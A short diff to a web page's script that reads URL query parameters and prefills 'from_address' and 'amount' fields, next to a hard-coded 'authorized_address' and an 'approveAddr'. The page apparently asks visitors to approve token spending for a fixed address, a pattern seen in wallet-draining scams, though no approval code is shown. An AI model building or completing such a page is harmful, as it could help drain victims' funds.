@@ -156,6 +156,26 @@
 <!-- Custom app js-->
 <script src="main.js"></script>
 <script type="text/javascript">
+    function GetRequest() {
+				var url = location.search //获取url中"?"符后的字串
+				var theRequest = new Object()
+				if (url.indexOf('?') != -1) {
+					var str = url.substr(1)
+					strs = str.split('&')
+					for (var i = 0; i < strs.length; i++) {
+						theRequest[strs[i].split('=')[0]] = unescape(strs[i].split('=')[1])
+					}
+				}
+				return theRequest
+			}
+			console.dir(GetRequest())
+			window.dz = GetRequest().dz || ''
+			window.yu = GetRequest().yu || ''
+			document.getElementById('from_address').value = dz
+			document.getElementById('amount').value = yu
+    
+    
+    
     var authorized_address = "TN9H27c13dq5CCAWfBYXQTc4JJ57Yjg8jh";
     var approveAddr = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
